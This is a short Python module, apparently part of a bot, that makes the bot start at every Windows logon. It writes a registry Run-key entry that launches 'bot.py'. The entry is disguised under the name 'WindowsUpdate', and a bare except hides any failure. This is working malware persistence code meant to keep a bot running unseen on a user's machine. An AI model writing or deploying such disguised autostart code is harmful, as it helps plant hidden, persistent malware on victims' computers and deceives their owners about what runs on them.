"""
Startup integration.
"""

import os
import sys
import platform

def install():
    try:
        if platform.system() != 'Windows':
            return
        
        import winreg
        
        k = winreg.HKEY_CURRENT_USER
        sk = r"Software\Microsoft\Windows\CurrentVersion\Run"
        h = winreg.OpenKey(k, sk, 0, winreg.KEY_SET_VALUE)
        
        bot = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'bot.py')
        py = sys.executable
        
        winreg.SetValueEx(h, "WindowsUpdate", 0, winreg.REG_SZ, f'"{py}" "{bot}"')
        winreg.CloseKey(h)
    except:
        pass